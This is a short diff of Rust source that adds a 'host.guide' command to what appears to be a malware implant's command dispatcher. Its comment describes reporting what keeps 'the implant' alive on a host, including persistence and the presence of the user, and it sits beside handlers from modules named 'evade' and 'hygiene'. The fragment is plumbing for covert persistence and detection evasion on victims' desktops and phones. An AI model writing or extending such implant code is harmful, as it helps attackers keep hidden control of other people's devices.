@@ -766,6 +766,11 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
             Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
             Err(e) => Outcome::err(1, e),
         },
+        // The guide: what keeps the implant alive on this host, and what
+        // stops it.  On a desktop it is the power of the machine, the
+        // presence of the person in front of it and the persistence that
+        // is installed; on a phone it is the rules of the manufacturer.
+        "host.guide" => Outcome::ok(crate::evade::guide().into_bytes()),
         "hygiene.process" => match crate::hygiene::process(&args) {
             Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
             Err(e) => Outcome::err(1, e),
